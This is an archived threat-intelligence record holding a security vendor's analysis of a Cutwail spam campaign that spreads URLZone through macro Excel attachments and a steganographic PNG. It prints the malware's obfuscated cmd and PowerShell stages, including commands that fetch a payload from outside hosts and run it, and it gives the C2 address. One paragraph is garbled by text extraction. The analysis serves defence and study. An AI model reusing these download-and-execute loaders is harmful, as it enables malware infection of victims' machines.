{
    "id": "e2962e0a-782d-46ba-b97c-4671cfe1c3ad",
    "created_at": "2023-01-12T15:02:13.915272Z",
    "updated_at": "2025-03-27T02:14:35.369897Z",
    "deleted_at": null,
    "sha1_hash": "7bac8ada6980fd9551bb22f319b9f7b92b206ddf",
    "title": "2018-10-25 - Cutwail Spam Campaign Uses Steganography to Distribute URLZone",
    "authors": "",
    "file_creation_date": "2022-05-28T00:28:17Z",
    "file_modification_date": "2022-05-28T00:28:17Z",
    "file_size": 2143482,
    "plain_text": "# Cutwail Spam Campaign Uses Steganography to Distribute URLZone\n\n**crowdstrike.com/blog/cutwail-spam-campaign-uses-steganography-to-distribute-urlzone/**\n\nSebastian Eschweiler, Brett Stone-Gross, and Bex Hartley October 25, 2018\n\nCrowdStrike® Falcon® Intelligence™ has observed a new Cutwail spam campaign from NARWHAL SPIDER on 24 October 2018. NARWHAL\nSPIDER is the adversary name designated by Falcon Intelligence for the criminal operator of Cutwail version 2. NARWHAL SPIDER primarily\nprovides spam services with a large customer base that has included malware operators such as WIZARD SPIDER (developer of TrickBot),\naffiliates of BAMBOO SPIDER (developer of Panda Zeus), and many others including URLZone, Nymaim and Gozi ISFB. The targets and\npayloads delivered through Cutwail spam campaigns are determined by the customers of NARWHAL SPIDER.\n\nThe Japanese-language spam campaign uses a mixture of malicious PowerShell (PS) and steganography — a method of sending data in a\nconcealed format — to distribute the eCrime malware family URLZone (a.k.a. Bebloh).\n\nThe Japanese-language emails contain a malicious, macro-enabled Microsoft Excel attachment named with the pattern\n```\nDOC2410201810{DIGIT[6]}.xls, and have a SHA256 hash of\n54303e5aa05db2becbef0978baa60775858899b17a5d372365ba3c5b1220fd2e . A screenshot of this attachment is provided in Figure 1. The\n\n```\nmessage body of the spam email is either blank or consists of the content provided in Table 1, which also lists the possible subject lines.\n\n**Table 1. Cutwail Spam Campaign Details**\n\n\n-----\n\n**Figure 1. Screenshot of Malicious, Macro-enabled Microsoft Excel Document**\n\nUpon opening the Excel document and enabling macros, the victim machine begins to run through the series of events detailed below.\n\n## Stage 1: Deobfuscation Routine\n\nThe embedded Visual Basic Application (VBA) code runs cmd.exe as shown below:\n```\ncmd.exe /V:ON/C\"set lW=o.crm`VPx57^^l(SEX]L8{-Y=GZU:K%0B[9ia2eb*yftp_/T$j1'vdMF^|C\\Hwk^&)WAIDn+}h4,sg6;3 R\"\"ON&&for\n%9 in\n(15,2,70,82,45,78,78,47,71,24,10,23,32,42,22,7,15,17,13,50,53,50,68,50,64,46,70,50,62,78,76,78,78,78,47,71,19,16,10,23,7\nset Rc=!Rc!!lW:~%9,1!&&if %9 geq 84 cmd /C!Rc:~-1334!\"\n\n```\nThis command decodes and executes a second stage, which is a combination of another Windows batch command with a PS command.\n\n## Stage 2: Download Image File and Execute PowerShell Command\n\nStage 2 is shown in the following code below:\n```\ncmd /CEchO/ $4G7=[tYPE]('M'+'ATh') ;  $48X7= [type]('SystEm.T'+'Ex'+'T'+'.ENc'+'o'+'DIng'); .(\"{1}{0}\" f'l','sa') ('a') (\"{0}{2}{1}\" -f'New','ct','-Obje');^^^&(\"{0}{1}\"-f 'Add-T','ype') -AssemblyName\n\"System.Drawing\";${g}=^^^&('a') (\"{4}{2}{1}{0}{3}\"-f '.Bi','ing','w','tmap','System.Dra')((^^^&('a') (\"{0}{1}{3}{2}\"\n-f 'Net.','We','t','bClien')).(\"{1}{0}\" f'penRead','O').Invoke(\"https://images2.imgbox.com/ca/88/A2ZSlW6S_o.png\"));${O}=^^^&('a') (\"{0}{1}\"-f'Byte','[]')\n1860;(0..2)^^^|.('%'){foreach(${x} in(0..619)){${p}=${g}.(\"{0}{1}\" -f 'GetPi','xel').Invoke(${x},${_});${o}\n[${_}*620+${X}]=( $4g7::(\"{1}{0}\"-f 'loor','F').Invoke((${p}.\"B\"-band15)*16)-bor(${p}.\"g\" -band 15))}};^^^&(\"{0}{1}\"\n-f'I','EX')( ( LS vARIabLE:48x7 ).ValUE::\"a`scii\".\"get`s`TrInG\"(${O}[0..1341])) |c:\\wIndOws\\SyStem32\\CliP.ExE\n&&CMd.Exe /c powerSHELL -ExeCUTIONpOl BYPass -NoniN -wIndOwSTY HIDDEn -nOpROFi -st -NolOgO . ( \\\"{0}{1}{2}\\\" -f\n'Add',( \\\"{0}{1}\\\" -f'-','Typ' ),'e' ) -Assem (\\\"{3}{1}{5}{0}{4}{2}\\\" -f ( \\\"{2}{1}{0}\\\" -f'd','.Win','em'\n),'ys','s','S',( \\\"{2}{1}{0}\\\"-f 'Form','.','ows'),'t') ; ^^^& ( ${e`NV`:cOMs`pec}[4,15,25]-jOIN'') ( (\n[SYSteM.WiNDoWs.ForMS.CLIPbOaRd]::(\\\"{0}{1}\\\" -f 'G',(\\\"{0}{1}\\\" -f'e','ttExT' )).\\\"i`Nv`oKE\\\"( ) ) ) ;\n[System.Windows.Forms.Clipboard]::(\\\"{0}{1}\\\" -f'Cl','ear' ).\\\"i`NvO`kE\\\"( )\n\n```\nThe PS command provided above results in the following sequential actions:\n\nDownloads an image and decodes a third stage (detailed below)\nCopies stage 3 to the clipboard\nExecutes PS command to initiate stage 3\n\nThe stage 2 PS command downloads a PNG file from the URL `https://images2.imgbox[.]com/ca/88/A2ZSlW6S_o.png.`\n\nThe downloaded image has the SHA256 hash `73da11127aa1da5538d153ba7f063c74fb90af46da581f098f179e1bb8371904 and is shown`\nbelow:\n\n\n-----\n\n**Figure 2. Screenshot of Downloaded Image File with Steganography to Hide the Payload**\n\nNext, the command decodes hidden data using digital steganography from the image. The information is hidden in the blue (B) and green (G)\nchannels of the image. To be more exact, the four least significant bits of the blue and green channels contain another PS script (stage 3). The\nfour bits from the blue channel form the most significant bits of the data, and the four bits from the green channel form the least significant bits\nto produce the full byte of the output, as shown below:\n\nThe following Python code extracts the PowerShell command from the image:\n```\nfrom PIL import Image import sys\nimage = Image.open(sys.argv[1])\n\n```\n```\npixel = image.load()\npayload = bytearray()\n\n```\n```\nfor y in xrange(3):\nfor x in range(620):\nr, g, b = pixel[x,y]\n\n```\n```\npayload.append( (b&15) * 16 | (g&15) )\nprint(payload)\n\n```\n\nThe stage 3 PS command is hidden in the first three rows of the image. The following image shows detail of the original image, with the red\nchannel removed for better visibility. It demonstrates the use of steganography, with a lower entropy in the first three rows.\n\n\n-----\n\n**Figure 3. Image Showing the Blue and Green Color Channels for the Downloaded Image containing a Hidden PowerShell Command in the First Three**\n\n**Rows**\n\nNext, the decoded stage 3 PS command is copied to the clipboard and executed. To that end, another instance of `powershell.exe is`\nspawned by stage 2. The new PS command copies the content of the clipboard and executes it. Finally, the clipboard content is cleared.\n\n## Stage 3: Further PowerShell Activity\n\nThe PS command in stage 3 is also highly obfuscated; a deobfuscated version is shown below:\n```\n$Ds = Get-Culture | Format-List -Property * | Out-String -Stream; if ($Ds -Match \"ja\") { $urls =\n\"http[:]//pigertime[.]com/mksettting\", \"\"; foreach ($url in $urls) {\nTry {\n\n```\n```\nwrite-Host $url; $fp = \"$env:temp\\pain.exe\"; Write-Host $fp; $wc = New-Object System[.]Net.WebClient;\n$wc.Headers.Add(\"user-agent\", \"Mozilla/5.0 (Windows NT; Windows NT 10.0; us-US) AppleWebKit/534.6 (KHTML, like Gecko)\nChrome/7.0.500.0 Safari/534.6\"); $wc.DownloadFile($url, $fp); Start-Process $fp; break\n}\n\n```\n```\nCatch {\nWrite-Host $_.Exception.Message\n\n```\n```\n}\n}\n}\n\n```\nThe obfuscated PS command first checks whether the current region settings contain the string `ja . This is most likely a superficial regional`\ncheck for the Japanese region. If this is the case, the victim machine makes an HTTP GET request to the URL\n```\nhttp[:]//pigertime[.]com/mksettting with the user agent Mozilla/5.0 (Windows NT; Windows NT 10.0; us-US)\nAppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6 . The payload is downloaded to %TEMP%\\pain.exe and\n\n```\nexecuted.\n\nThe downloaded payload has the SHA256 hash `03fe36e396a2730fa9a51c455d39f2ba8168e5e7b1111102c1e349b6eac93778 and is a`\nvariant of the eCrime malware downloader URLZone.\n\n## URLZone\n\nThe observed variant of URLZone is using a command-and-control (C2) server of `https://oaril[.]com/auth/ and the public key provided`\nbelow:\n```\n-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmk6zOuYcUd1H6vUyvuxrcozqW\nmOl5jTa9HDodiKaPtRPmNv2rRPF/4urX476F+SM6kmLcG04lnE3bEAQzO+kJJx8x\ngmxESN8piJ3aSxnjAqpt3rVjmwXmoULE1wnOFCKt32UmfZ7xNaPeYJyLvgcfGMme MGuPDjhqw5LmxzzSjwIDAQAB -----END PUBLIC KEY----\n```\nFollowing the successful installation of URLZone, the C2 sends a request to a URL to download and execute a malicious payload. Although\nFalcon Intelligence has yet to observe the final payload delivered, the previous Japanese-language spam campaigns that delivered URLZone\nresulted in the download of Gozi ISFB.\n\n\n-----\n\nt s ou d be oted t at C o dSt e a co s ab e to e e age t e be a o a patte desc bed t s b og a d p o des co e age aga st t s\nthreat. In addition, the Falcon machine learning algorithm is able to detect and prevent the URLZone payload from executing.\n\nCutwail spam levels in the last three months have been significantly lower. The introduction of steganography may suggest that NARWHAL\nSPIDER has been developing new, innovative methods to evade detection and improve infection rates. Although not commonly used by\neCrime actors, steganography has been used for malware delivery in the past, such as the Lurk Downloader and StegoLoader.\n\n**Learn more:**\n\n_To learn more about how to incorporate intelligence on threat actors such as NARWHAL SPIDER into your security strategy, please visit_\n_the_ _[Falcon threat intelligence product page.](https://www.crowdstrike.com/endpoint-security-products/falcon-x-threat-intelligence/)_\n_[Download the CrowdStrike 2020 Global Threat Report](https://www.crowdstrike.com/resources/reports/2020-crowdstrike-global-threat-report/)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-10-25 - Cutwail Spam Campaign Uses Steganography to Distribute URLZone.pdf"
    ],
    "report_names": [
        "2018-10-25 - Cutwail Spam Campaign Uses Steganography to Distribute URLZone.pdf"
    ],
    "threat_actors": [
        {
            "id": "98b22fd7-bf1b-41a6-b51c-0e33a0ffd813",
            "created_at": "2022-10-25T15:50:23.688973Z",
            "updated_at": "2025-03-27T02:00:55.524322Z",
            "deleted_at": null,
            "main_name": "APT-C-36",
            "aliases": [
                "APT-C-36",
                "Blind Eagle"
            ],
            "source_name": "MITRE:APT-C-36",
            "tools": [
                "Imminent Monitor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "dcba8e2b-93e0-4d6e-a15f-5c44faebc3b1",
            "created_at": "2022-10-25T16:07:23.816991Z",
            "updated_at": "2025-03-27T02:02:09.991944Z",
            "deleted_at": null,
            "main_name": "Lurk",
            "aliases": [],
            "source_name": "ETDA:Lurk",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cc045f52-bbdb-4fcc-8fbf-a0d8a7c5e64f",
            "created_at": "2022-10-25T16:07:24.519535Z",
            "updated_at": "2025-03-27T02:02:10.2689Z",
            "deleted_at": null,
            "main_name": "Narwhal Spider",
            "aliases": [
                "Gold Essex"
            ],
            "source_name": "ETDA:Narwhal Spider",
            "tools": [
                "Cutwail",
                "Pushdo"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bd43391b-b835-4cb3-839a-d830aa1a3410",
            "created_at": "2023-01-06T13:46:38.925525Z",
            "updated_at": "2025-03-27T02:00:02.95302Z",
            "deleted_at": null,
            "main_name": "APT-C-36",
            "aliases": [
                "Blind Eagle"
            ],
            "source_name": "MISPGALAXY:APT-C-36",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "03a8107a-f669-41af-ba79-41b1cbdc4654",
            "created_at": "2023-01-06T13:46:39.228649Z",
            "updated_at": "2025-03-27T02:00:03.026028Z",
            "deleted_at": null,
            "main_name": "BAMBOO SPIDER",
            "aliases": [],
            "source_name": "MISPGALAXY:BAMBOO SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c91f7778-69aa-45fa-be0e-4ee33daf8fbd",
            "created_at": "2023-01-06T13:46:39.110148Z",
            "updated_at": "2025-03-27T02:00:02.998873Z",
            "deleted_at": null,
            "main_name": "NARWHAL SPIDER",
            "aliases": [
                "GOLD ESSEX",
                "TA544"
            ],
            "source_name": "MISPGALAXY:NARWHAL SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f6f91e1c-9202-4497-bf22-9cd5ef477600",
            "created_at": "2023-01-06T13:46:38.86765Z",
            "updated_at": "2025-03-27T02:00:02.938998Z",
            "deleted_at": null,
            "main_name": "WIZARD SPIDER",
            "aliases": [
                "FIN12",
                "UNC2053",
                "Pistachio Tempest",
                "TEMP.MixMaster",
                "GOLD BLACKBURN",
                "Periwinkle Tempest",
                "DEV-0193",
                "Storm-0193",
                "Trickbot LLC",
                "DEV-0237"
            ],
            "source_name": "MISPGALAXY:WIZARD SPIDER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1f679d2e-c5c9-49e9-b854-2eca06a870e4",
            "created_at": "2022-10-25T16:07:24.453427Z",
            "updated_at": "2025-03-27T02:02:10.237233Z",
            "deleted_at": null,
            "main_name": "Bamboo Spider",
            "aliases": [
                "Bamboo Spider",
                "TA544"
            ],
            "source_name": "ETDA:Bamboo Spider",
            "tools": [
                "AndroKINS",
                "Bebloh",
                "Chthonic",
                "DELoader",
                "Dofoil",
                "GozNym",
                "Gozi ISFB",
                "ISFB",
                "Nymaim",
                "PandaBanker",
                "Pandemyia",
                "Sharik",
                "Shiotob",
                "Smoke Loader",
                "SmokeLoader",
                "Terdot",
                "URLZone",
                "XSphinx",
                "ZLoader",
                "Zeus OpenSSL",
                "Zeus Panda",
                "Zeus Sphinx",
                "ZeusPanda",
                "nymain"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e6a21528-2999-4e2e-aaf4-8b6af14e17f3",
            "created_at": "2022-10-25T16:07:24.422115Z",
            "updated_at": "2025-03-27T02:02:10.216817Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "DEV-0193",
                "Gold Blackburn",
                "Gold Ulrick",
                "Grim Spider",
                "ITG23",
                "Operation BazaFlix",
                "Periwinkle Tempest",
                "TEMP.MixMaster",
                "Wizard Spider"
            ],
            "source_name": "ETDA:Wizard Spider",
            "tools": [
                "AdFind",
                "Agentemis",
                "Anchor_DNS",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "Conti",
                "Diavol",
                "Dyranges",
                "Dyre",
                "Dyreza",
                "Dyzap",
                "Gophe",
                "Invoke-SMBAutoBrute",
                "KEGTAP",
                "LaZagne",
                "LightBot",
                "PowerSploit",
                "PowerTrick",
                "PsExec",
                "Ryuk",
                "SessionGopher",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "TrickMo",
                "Upatre",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bc119938-a79c-4e5f-9d4d-dc96835dfe2e",
            "created_at": "2024-06-04T02:03:07.799286Z",
            "updated_at": "2025-03-27T02:05:17.337094Z",
            "deleted_at": null,
            "main_name": "GOLD BLACKBURN",
            "aliases": [
                "Periwinkle Tempest ",
                "Wizard Spider ",
                "ITG23 "
            ],
            "source_name": "Secureworks:GOLD BLACKBURN",
            "tools": [
                " Buer Loader",
                " Dyre",
                " Team9",
                " TrickBot",
                "BazarLoader"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "43ba91b1-fefc-493b-a75c-6af4b34e5819",
            "created_at": "2022-10-25T16:47:55.737812Z",
            "updated_at": "2025-03-27T02:05:17.357092Z",
            "deleted_at": null,
            "main_name": "GOLD ESSEX",
            "aliases": [
                "Narwhal Spider "
            ],
            "source_name": "Secureworks:GOLD ESSEX",
            "tools": [
                " Pony",
                " Pushdo",
                "Cutwail"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "be597b07-0cde-47bc-80c3-790a8df34af4",
            "created_at": "2022-10-25T16:07:23.407484Z",
            "updated_at": "2025-03-27T02:02:09.784411Z",
            "deleted_at": null,
            "main_name": "Blind Eagle",
            "aliases": [
                "APT-C-36",
                "APT-Q-98",
                "AguilaCiega"
            ],
            "source_name": "ETDA:Blind Eagle",
            "tools": [
                "AsyncRAT",
                "BitRAT",
                "Bladabindi",
                "BlotchyQuasar",
                "Imminent Monitor",
                "Imminent Monitor RAT",
                "Jorik",
                "LimeRAT",
                "Remcos",
                "RemcosRAT",
                "Remvio",
                "Socmer",
                "Warzone",
                "Warzone RAT",
                "njRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535733,
    "ts_updated_at": 1743041675,
    "ts_creation_date": 1653697697,
    "ts_modification_date": 1653697697,
    "files": {
        "pdf": "https://archive.orkl.eu/7bac8ada6980fd9551bb22f319b9f7b92b206ddf.pdf",
        "text": "https://archive.orkl.eu/7bac8ada6980fd9551bb22f319b9f7b92b206ddf.txt",
        "img": "https://archive.orkl.eu/7bac8ada6980fd9551bb22f319b9f7b92b206ddf.jpg"
    }
}